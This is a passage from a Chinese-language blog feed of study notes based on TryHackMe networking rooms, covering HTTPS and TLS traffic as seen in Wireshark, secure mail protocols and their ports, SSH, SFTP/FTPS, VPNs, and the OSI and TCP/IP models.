&lt;p&gt;一般来说，签署证书需要支付年费。但是，&lt;a class=&#34;link&#34; href=&#34;https://letsencrypt.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Let&amp;rsquo;s Encrypt&lt;/a&gt; 允许您免费签署您的证书。&lt;/p&gt;
&lt;p&gt;最后，我们应该提到一些用户选择创建自签名证书。自签名证书无法证明服务器的真实性，因为没有第三方确认它。&lt;/p&gt;
&lt;h2 id=&#34;https协议&#34;&gt;HTTPS协议
&lt;/h2&gt;&lt;p&gt;正如我们在 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/networkingcoreprotocols&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Networking Core Protocols&lt;/a&gt; 房间里所研究的那样，HTTP 依赖于 TCP，并默认使用端口 80。我们还看到了所有 HTTP 流量如何以明文形式发送，供任何人拦截和监控。下面的屏幕截图来自上一个房间，它清楚地说明了对手如何轻松读取客户端和服务器之间交换的所有流量。&lt;/p&gt;
&lt;p&gt;让我们花点时间回顾一下 Web 浏览器可以通过 HTTP 请求页面之前的最常见步骤。将域名解析为 IP 地址后，客户端将执行以下两个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与目标服务器建立 TCP 三次握手&lt;/li&gt;
&lt;li&gt;使用 HTTP 协议进行通信;例如，发出 HTTP 请求，例如 &lt;code&gt;GET / HTTP/1.1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述两个步骤显示在下面的窗口中。TCP 握手的三个数据包（标有 1）位于第一个包含 &lt;code&gt;GET&lt;/code&gt; 的 HTTP 数据包之前。HTTP 通信标有 2。最后显示的三个数据包用于 TCP 连接终止，并标有 3。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408021637270.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408021637270&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;http-over-tls&#34;&gt;HTTP Over TLS
&lt;/h3&gt;&lt;p&gt;HTTPS 代表安全超文本传输协议。它基本上是 HTTP over TLS。因此，通过 HTTPS 请求页面需要以下三个步骤（解析域名后）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;与目标服务器建立 TCP 三次握手&lt;/li&gt;
&lt;li&gt;建立 TLS 会话&lt;/li&gt;
&lt;li&gt;使用 HTTP 协议进行通信;例如，发出 HTTP 请求，例如 &lt;code&gt;GET / HTTP/1.1&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面的屏幕截图显示，在前三个数据包中建立了 TCP 会话，标记为 &lt;code&gt;1&lt;/code&gt;。然后，交换多个数据包以协商 TLS 协议，标有 &lt;code&gt;2&lt;/code&gt;。&lt;code&gt;1&lt;/code&gt; 和 &lt;code&gt;2&lt;/code&gt; 是进行 &lt;strong&gt;TLS 协商和建立&lt;/strong&gt;的地方 。&lt;/p&gt;
&lt;p&gt;最后，在交换 &lt;strong&gt;HTTP 应用层数据&lt;/strong&gt;时（图中标记为 3 的部分），Wireshark 截图中显示为 &lt;strong&gt;“Application Data”（应用数据）&lt;/strong&gt;，而非具体的协议名称（如 HTTP）。这是因为数据通过 &lt;strong&gt;443 端口&lt;/strong&gt;（默认 HTTPS 端口）传输且经过 &lt;strong&gt;TLS/SSL 加密&lt;/strong&gt;，Wireshark 无法直接解析加密后的内容，因此无法确认它是否为 HTTP 或其他协议（如 FTP over TLS）。&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408021811071.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408021811071&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;正如预期的那样，如果尝试跟踪数据包流并组合其所有内容，他们只会得到乱码，如下面的屏幕截图所示。交换的流量是加密的;红色由客户端发送，蓝色由服务器发送。如果不获&lt;strong&gt;取加密密钥&lt;/strong&gt;，就无法知道内容。&lt;/p&gt;
&lt;h4 id=&#34;获取加密密钥&#34;&gt;获取加密密钥
&lt;/h4&gt;&lt;p&gt;将 TLS 添加到 HTTP 会导致所有数据包都被&lt;strong&gt;加密&lt;/strong&gt;。除非我们获得&lt;strong&gt;私钥&lt;/strong&gt;的访问权限，否则我们无法再看到交换数据包的内容。尽管我们不太可能访问 TLS 会话中用于加密的密钥，但在向 Wireshark 提供解密密钥后，我们重复了上述屏幕截图。TCP 和 TLS 握手不会更改;主要区别从标记为 3 的 HTTP 协议开始。例如，我们可以看到客户端何时发出 &lt;code&gt;GET&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408021935959.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408021935959&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果您想看到交换的数据，现在是您的机会！它仍然是隐藏在窥探者的常规 HTTP 流量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408021955413.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408021955413&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心结论&lt;/strong&gt;：TLS（传输层安全协议）为HTTP提供了安全保障，且&lt;strong&gt;无需对底层（如TCP/IP）或上层协议（如HTTP）进行任何修改&lt;/strong&gt;。具体而言：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;TCP/IP协议栈保持原状&lt;/strong&gt;：传输层（TCP）和网络层（IP）的运作机制未改变。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP的传输方式升级&lt;/strong&gt;：原本通过TCP明文传输的HTTP数据，现改为通过TLS加密信道传输，但&lt;strong&gt;HTTP协议本身的结构和语法无需调整&lt;/strong&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;smtpspop3s和imaps&#34;&gt;SMTPS,POP3S和IMAPS
&lt;/h2&gt;&lt;p&gt;将 TLS 添加到 SMTP、POP3 和 IMAP 与将 TLS 添加到 HTTP 没有什么不同。与 HTTP 获取附加的 S 表示&lt;em&gt;安全&lt;/em&gt;并变为 HTTPS、SMTP、POP3 和 IMAP 分别变为 SMTPS、POP3S 和 IMAPS 类似。通过 TLS 使用这些协议与使用 HTTP over TLS 没有什么不同;因此，HTTPS 讨论中的几乎所有要点都适用于这些协议。&lt;/p&gt;
&lt;p&gt;不安全版本使用下表中所示的默认 TCP 端口号：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;默认端口号&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;HTTP&lt;/td&gt;
          &lt;td&gt;80&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SMTP&lt;/td&gt;
          &lt;td&gt;25&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;POP3&lt;/td&gt;
          &lt;td&gt;110&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;IMAP&lt;/td&gt;
          &lt;td&gt;143&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;默认情况下，安全版本（即通过 TLS）使用以下 TCP 端口号：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;默认端口号&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;HTTPS&lt;/td&gt;
          &lt;td&gt;443&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SMTPS&lt;/td&gt;
          &lt;td&gt;465 和 587&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;POP3S&lt;/td&gt;
          &lt;td&gt;995&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;IMAPS&lt;/td&gt;
          &lt;td&gt;993&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TLS 可以添加到许多其他协议中;理由和优势是相似的。&lt;/p&gt;
&lt;h2 id=&#34;ssh&#34;&gt;SSH
&lt;/h2&gt;&lt;p&gt;我们在 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/networkingconcepts&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Networking Concepts&lt;/a&gt; 会议室中使用了 TELNET 协议。尽管登录和管理远程系统非常方便，但当所有流量都以明文形式发送时，风险很大。使用 &lt;code&gt;telnet&lt;/code&gt; 后，任何监控网络流量的人都很容易获得您的登录凭据。这个问题需要一个解决方案。Tatu Ylönen 开发了安全外壳 （SSH） 协议，并于 &lt;strong&gt;1995&lt;/strong&gt; 年作为免费软件发布了 SSH-1。（有趣的是，Netscape Communications 在同一年发布了 SSL 2.0 协议。1996 年定义了一个更安全的版本 SSH-2。&lt;strong&gt;1999&lt;/strong&gt; 年，OpenBSD 开发人员发布了 OpenSSH，这是 SSH 的开源实现。如今，当您使用 SSH 客户端时，它很可能基于 OpenSSH 库和源代码。&lt;/p&gt;
&lt;p&gt;OpenSSH 有几个好处。我们将列出几个关键点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;安全身份验证&lt;/strong&gt; ：除了基于密码的身份验证外，SSH 还支持公钥和双因素身份验证。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;机密性&lt;/strong&gt; ：OpenSSH 提供端到端加密，防止窃听。此外，它还会通知您新的服务器密钥，以防止中间人攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;完整性&lt;/strong&gt; ：除了保护交换数据的机密性外，加密技术还保护流量的完整性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;隧道&lt;/strong&gt; ：SSH 可以创建一个安全的“隧道”，通过 SSH 路由其他协议。此设置会导致类似 VPN 的连接。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;X11 转发&lt;/strong&gt; ：如果您连接到具有图形用户界面的类 Unix 系统，SSH 允许您通过网络使用图形应用程序。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;您可以发出命令 &lt;code&gt;ssh username@hostname&lt;/code&gt; 以连接到 SSH 服务器。如果用户名与您登录的用户名相同，则只需要 &lt;code&gt;ssh hostname &lt;/code&gt;。然后，系统会要求您输入密码;但是，如果使用公钥身份验证，您将立即登录。&lt;/p&gt;
&lt;p&gt;下面的屏幕截图显示了在远程 Kali Linux 系统上运行 Wireshark 的示例。需要参数 &lt;code&gt;-X&lt;/code&gt; 来支持正在运行的图形界面，例如 &lt;code&gt;ssh 192.168.124.148 -X&lt;/code&gt;。（本地系统需要安装合适的图形系统。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408022949700.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408022949700&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;当 TELNET 服务器侦听端口 23 时，SSH 服务器侦听端口 22。&lt;/p&gt;
&lt;h2 id=&#34;sftp和ftps&#34;&gt;SFTP和FTPS
&lt;/h2&gt;&lt;p&gt;SFTP 代表 SSH 文件传输协议，允许安全的文件传输。它是 SSH 协议套件的一部分，共享相同的端口号 22。如果在 OpenSSH 服务器配置中启用，则可以使用 &lt;code&gt;sftp username@hostname&lt;/code&gt; 等命令进行连接。登录后，您可以发出 &lt;code&gt;get filename&lt;/code&gt; 和 &lt;code&gt;put filename&lt;/code&gt; 等命令来分别下载和上传文件。一般来说，SFTP 命令类似于 Unix，可能与 FTP 命令不同。&lt;/p&gt;
&lt;p&gt;SFTP 不应与 FTPS 混淆。您认为 FTPS 代表 File Transfer Protocol Secure 是正确的。FTPS 如何得到保护？是的，您正确地估计它是使用 TLS 保护的，就像 HTTPS 一样。FTP 使用端口 21，而 FTPS 通常使用端口 990。它需要证书设置，并且允许通过严格的防火墙可能很棘手，因为它使用单独的连接进行控制和数据传输。&lt;/p&gt;
&lt;p&gt;设置 SFTP 服务器就像在 OpenSSH 服务器中启用一个选项一样简单。与 HTTPS、SMTPS、POP3S、IMAPS 和其他依赖 TLS 确保安全性的协议一样，FTPS 需要适当的 TLS 证书才能安全运行。&lt;/p&gt;
&lt;h2 id=&#34;vpn&#34;&gt;VPN
&lt;/h2&gt;&lt;p&gt;考虑一家在不同地理位置设有办事处的公司。该公司能否将其所有办公室和站点连接到主分支机构，以便任何设备都可以访问共享资源，就像实际位于主分支机构一样？答案是肯定的;此外，最经济的解决方案是使用 Internet 基础设施设置虚拟专用网络 （VPN）。此处的重点是 VPN 中 V 表示虚拟。&lt;/p&gt;
&lt;p&gt;在设计 Internet 时，TCP/IP 协议套件专注于传输数据包。例如，如果路由器停止服务，路由协议可以适应并选择不同的路由来发送其数据包。如果数据包未被确认，TCP 具有内置机制来检测这种情况并重新发送。但是，没有任何机制可以&lt;strong&gt;确保所有离开&lt;/strong&gt;或进入计算机的数据都受到保护，不会泄露和更改。一种流行的解决方案是设置 VPN 连接。这里的重点是 VPN 中 Private 的 P。&lt;/p&gt;
&lt;p&gt;几乎所有公司都要求在其虚拟网络中进行“私有”信息交换。因此，VPN 提供了一种非常方便且相对便宜的解决方案。主要要求是 Internet 连接以及 VPN 服务器和客户端。&lt;/p&gt;
&lt;p&gt;下面的网络图显示了一个公司示例，其中有两个远程分支机构连接到 main 分支机构。远程分支中的 VPN 客户端应连接到主分支中的 VPN 服务器。在这种情况下，VPN 客户端将加密流量，并通过已建立的 VPN 隧道（以蓝色显示）将其传递到主分支。VPN 流量仅限于蓝线;绿线将承载解密的 VPN 流量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408023521571.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408023521571&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在下面的网络图中，我们看到两个远程用户使用 VPN 客户端连接到主分支中的 VPN 服务器。在这种情况下，VPN 客户端连接单个设备。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408023613003.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408023613003&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一旦建立了 VPN 隧道，我们所有的 Internet 流量通常都将通过 VPN 连接路由，即通过 VPN 隧道。因此，当我们尝试访问 Internet 服务或 Web 应用程序时，他们不会看到我们的公共 IP 地址，而是 VPN 服务器的地址。这就是为什么一些 Internet 用户通过 VPN 连接以规避地理限制的原因。此外，本地 ISP 只会看到加密流量，这限制了其审查 Internet 访问的能力。&lt;/p&gt;
&lt;p&gt;换句话说，如果用户连接到日本的 VPN 服务器，他们访问的服务器将看起来就像位于日本一样。这些服务器将相应地定制他们的体验，例如将他们重定向到该服务的日本版本。下面的屏幕截图显示了连接到日本的 VPN 服务器后的 Google 搜索页面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408023651114.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408023651114&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;最后，尽管在许多情况下，人们会建立 VPN 连接以通过 VPN 隧道路由所有流量，但某些 VPN 连接不会这样做。VPN 服务器可能配置为允许您访问私有网络，但不路由您的流量。此外，一些 VPN 服务器会泄露您的实际 IP 地址，尽管它们应该通过 VPN 路由您的所有流量。根据您使用 VPN 连接的原因，您可能需要运行更多测试，例如 DNS 泄漏测试。&lt;/p&gt;
&lt;p&gt;最后，一些国家认为使用 VPN 是非法的，甚至会受到惩罚。在使用 VPN 之前，尤其是在旅行时，请查看当地的法律法规。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络概念</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/</link>
        <pubDate>Tue, 08 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/</guid>
        <description>&lt;h2 id=&#34;osi&#34;&gt;OSI
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;please do not throw spinach pizza away&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;layer-1-physical-layer&#34;&gt;Layer 1: Physical Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;物理层&lt;/strong&gt;处理&lt;strong&gt;设备&lt;/strong&gt;之间的物理连接;这包括&lt;strong&gt;介质&lt;/strong&gt; （如线路） 以及二进制数字 0 和 1 的定义。数据传输可以通过电、光学或无线信号进行。因此，我们需要数据线或天线，具体取决于我们的物理介质。&lt;/p&gt;
&lt;h3 id=&#34;layer-2-data-link-layer&#34;&gt;Layer 2: Data Link Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;数据链路层&lt;/strong&gt;，代表实现&lt;strong&gt;同一网段&lt;/strong&gt;节点之间数据传输的&lt;strong&gt;协议&lt;/strong&gt;。让我们用更简单的术语来表达。数据链路层描述了&lt;strong&gt;同一网段上不同系统之间&lt;/strong&gt;关于如何通信的&lt;strong&gt;协议&lt;/strong&gt;。网段是指使用共享介质或通道进行信息传输的一组联网设备。例如，假设公司办公室有 10 台计算机连接到&lt;strong&gt;网络交换机&lt;/strong&gt;;那是一个网段。&lt;/p&gt;
&lt;p&gt;第 2 层的示例包括以太网（即 802.3）和 WiFi（即 802.11）。以太网和 WiFi 地址为 6 个字节。它们的地址称为 MAC 地址，其中 MAC 代表媒体访问控制。它们通常以十六进制格式表示，每两个字节之间用冒号分隔。最左边的三个字节标识供应商。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250407225141784.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250407225141784&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;layer-3-network-layer&#34;&gt;Layer 3: Network Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;网络层&lt;/strong&gt;，关注在&lt;strong&gt;不同网络之间&lt;/strong&gt;发送数据。用更专业的术语来说，网络层处理逻辑寻址和路由，即找到在不同网络之间传输网络数据包的&lt;strong&gt;路径&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在数据链路层，我们给出了一个公司办公室有 10 台计算机的示例，其中数据链路层负责在它们之间提供连接。假设这家公司在多个办事处，分布在不同的城市、国家甚至大洲。网络层负责将&lt;strong&gt;不同的办公室&lt;/strong&gt;连接在一起。&lt;/p&gt;
&lt;p&gt;下面的网络显示计算机 A 和 B 已连接，尽管位于&lt;strong&gt;不同的网络&lt;/strong&gt;上。您还可以注意到连接两台计算机的两条路径;网络层将通过其认为更好的路径路由网络数据包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250407225357047.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250407225357047&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;网络层的示例包括 Internet 协议 （IP）、Internet 控制消息协议 （ICMP） 和虚拟专用网络 （VPN） 协议，例如 IPSec 和 SSL/TLS VPN。&lt;/p&gt;
&lt;h3 id=&#34;layer-4-transport-layer&#34;&gt;Layer 4: Transport Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;传输层&lt;/strong&gt;支持&lt;strong&gt;不同主机上&lt;/strong&gt;正在运行的&lt;strong&gt;应用程序&lt;/strong&gt;之间的端到端通信。您的 Web 浏览器通过传输层连接到 TryHackMe Web 服务器，该服务器可以支持流控制、分段和纠错等各种功能。&lt;/p&gt;
&lt;p&gt;第 4 层的示例包括传输控制协议 （TCP） 和用户数据报协议 （UDP）。&lt;/p&gt;
&lt;h3 id=&#34;layer-5-session-layer&#34;&gt;Layer 5: Session Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;会话层&lt;/strong&gt;负责&lt;strong&gt;建立、维护和同步&lt;/strong&gt;在不同主机上运行的应用程序之间的通信。建立会话意味着启动应用程序之间的通信并协商会话的必要参数。数据同步可确保数据以正确的顺序传输，并提供在传输失败时恢复的机制。&lt;/p&gt;
&lt;p&gt;会话层的示例包括网络文件系统 （NFS） 和远程过程调用 （RPC）。&lt;/p&gt;
&lt;h3 id=&#34;layer-6-presentation-layer&#34;&gt;Layer 6: Presentation Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;表示层&lt;/strong&gt;确保以&lt;strong&gt;应用程序层&lt;/strong&gt;可以理解的&lt;strong&gt;形式&lt;/strong&gt;交付数据。第 6 层处理数据编码、压缩和加密。编码的一个示例是字符编码，例如 ASCII 或 Unicode。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表示层采用多种标准化格式。&lt;/strong&gt; 以电子邮件发送图像场景为例：首先使用JPEG、GIF、PNG格式存储图像；随后通过MIME（多用途互联网邮件扩展）协议将文件附加至邮件，虽然邮件客户端对用户隐藏了这一过程。MIME协议通过7位ASCII字符实现二进制文件编码。&lt;/p&gt;
&lt;h3 id=&#34;layer-7-application-layer&#34;&gt;Layer 7: Application Layer
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;应用层&lt;/strong&gt;直接向最终用户&lt;strong&gt;应用程序&lt;/strong&gt;提供网络服务。您的 Web 浏览器将使用 &lt;strong&gt;HTTP 协议&lt;/strong&gt;来请求文件、提交表单或上传文件。&lt;/p&gt;
&lt;p&gt;应用程序层是&lt;strong&gt;顶层&lt;/strong&gt;，当您使用不同的应用程序时，您可能已经遇到了它的许多协议。第 7 层协议的示例包括 HTTP、FTP、DNS、POP3、SMTP 和 IMAP。&lt;/p&gt;
&lt;h3 id=&#34;summary&#34;&gt;Summary
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;层数&lt;/th&gt;
          &lt;th&gt;图层名称&lt;/th&gt;
          &lt;th&gt;主要功能&lt;/th&gt;
          &lt;th&gt;示例协议和标准&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;第 7 层&lt;/td&gt;
          &lt;td&gt;Application layer 应用层&lt;/td&gt;
          &lt;td&gt;为应用程序提供服务和接口&lt;/td&gt;
          &lt;td&gt;HTTP, FTP, DNS, POP3, SMTP, IMAP HTTP、FTP、DNS、POP3、SMTP、IMAP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 6 层&lt;/td&gt;
          &lt;td&gt;Presentation layer 表示层&lt;/td&gt;
          &lt;td&gt;数据编码、加密和压缩&lt;/td&gt;
          &lt;td&gt;Unicode, MIME, JPEG, PNG, MPEG Unicode 、MIME、JPEG、PNG、MPEG&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 5 层&lt;/td&gt;
          &lt;td&gt;Session layer 会话层&lt;/td&gt;
          &lt;td&gt;建立、维护和同步会话&lt;/td&gt;
          &lt;td&gt;NFS, RPC NFS 和 RPC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 4 层&lt;/td&gt;
          &lt;td&gt;Transport layer 传输层&lt;/td&gt;
          &lt;td&gt;端到端通信和数据分段&lt;/td&gt;
          &lt;td&gt;UDP, TCP UDP、TCP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 3 层&lt;/td&gt;
          &lt;td&gt;Network layer 网络层&lt;/td&gt;
          &lt;td&gt;网络之间的逻辑寻址和路由&lt;/td&gt;
          &lt;td&gt;IP, ICMP, IPSec IP、ICMP、IPSec&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 2 层&lt;/td&gt;
          &lt;td&gt;Data link layer 数据链路层&lt;/td&gt;
          &lt;td&gt;相邻节点之间的可靠数据传输&lt;/td&gt;
          &lt;td&gt;以太网 （802.3）、WiFi （802.11）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;第 1 层&lt;/td&gt;
          &lt;td&gt;Physical layer 物理层&lt;/td&gt;
          &lt;td&gt;物理数据传输介质&lt;/td&gt;
          &lt;td&gt;电气、光学和无线信号&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;tcpip&#34;&gt;TCP/IP
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;网络架构演进解析&lt;/strong&gt;
在完成ISO OSI参考模型的理论学习后，我们将转向实际应用的TCP/IP协议体系。该模型由传输控制协议（TCP）和互联网协议（IP）构成核心，系美国国防部（DoD）于20世纪70年代主导研发。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键技术特性解析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;军事级容错设计&lt;/strong&gt;
您可能会问：为何国防部要开发该模型？其核心优势在于实现网络的&amp;quot;去中心化生存能力&amp;quot;——即使部分节点因军事打击失效，网络仍可维持基本通信能力。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自适应路由机制&lt;/strong&gt;
这种韧性源于动态路由协议的设计创新，通过OSPF、BGP等协议实时感知网络拓扑变化，智能调整数据包传输路径（参见RFC 791/793）。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在我们介绍 ISO OSI 模型时，我们从下到上，从第 1 层到第 7 层。在这个任务中，让我们从不同的角度，从上到下看事情。从上到下，我们有：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Application Layer 应用层&lt;/strong&gt; ：OSI 模型应用层、表示层和会话层，即第 &lt;strong&gt;5、6 和 7 层&lt;/strong&gt;，在 TCP/IP 模型中被分组到&lt;strong&gt;应用层&lt;/strong&gt;中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Transport Layer 传输层&lt;/strong&gt; ：这是第 4 层。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Internet Layer Internet 层&lt;/strong&gt; ：这是第 3 层。OSI 模型的网络层在 TCP/IP 模型中称为 Internet 层。&lt;/p&gt;
&lt;p&gt;**Link Layer 链接层 **：这是第 2 层。&lt;/p&gt;
&lt;p&gt;下表显示了 TCP/IP 模型层如何映射到 ISO/OSI 模型层。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;层数&lt;/th&gt;
          &lt;th&gt;ISO OSI 模型&lt;/th&gt;
          &lt;th&gt;TCP/IP 模型 （RFC 1122）&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;7&lt;/td&gt;
          &lt;td&gt;Application Layer 应用层&lt;/td&gt;
          &lt;td&gt;Application Layer 应用层&lt;/td&gt;
          &lt;td&gt;HTTP, HTTPS, FTP, POP3, SMTP, IMAP, Telnet, SSH, HTTP、HTTPS、FTP、POP3、SMTP、IMAP、Telnet、SSH&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;6&lt;/td&gt;
          &lt;td&gt;Presentation Layer 表示层&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;Session Layer 会话层&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;Transport Layer 传输层&lt;/td&gt;
          &lt;td&gt;Transport Layer 传输层&lt;/td&gt;
          &lt;td&gt;TCP, UDP TCP、UDP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;Network Layer 网络层&lt;/td&gt;
          &lt;td&gt;Internet Layer Internet 层&lt;/td&gt;
          &lt;td&gt;IP, ICMP, IPSec IP、ICMP、IPSec&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;Data Link Layer 数据链路层&lt;/td&gt;
          &lt;td&gt;Link Layer 链接层&lt;/td&gt;
          &lt;td&gt;Ethernet 802.3, WiFi 802.11 以太网 802.3、WiFi 802.11&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;Physical Layer 物理层&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
